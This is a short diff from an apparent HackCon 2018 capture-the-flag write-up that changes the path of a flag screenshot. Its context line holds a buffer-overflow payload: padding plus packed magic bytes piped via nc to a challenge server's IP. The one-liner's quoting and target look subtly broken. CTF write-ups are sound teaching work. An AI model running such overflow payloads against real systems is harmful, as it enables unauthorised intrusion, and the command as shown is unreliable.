@@ -58,4 +58,4 @@ Then here is the exploit and the flag:
 python -c 'print ("a"*72 + '\xbe\xba\xfe\xca\xef\xbe\xad\xde")' | nc 139.59.30.165
 ```
 
-![placeholder](https://ringr0p.github.io/images/hackcon2018-pwn2-flag.jpg)
+![placeholder](/images/writeups/HackCon2018/warchange/flag.jpg)
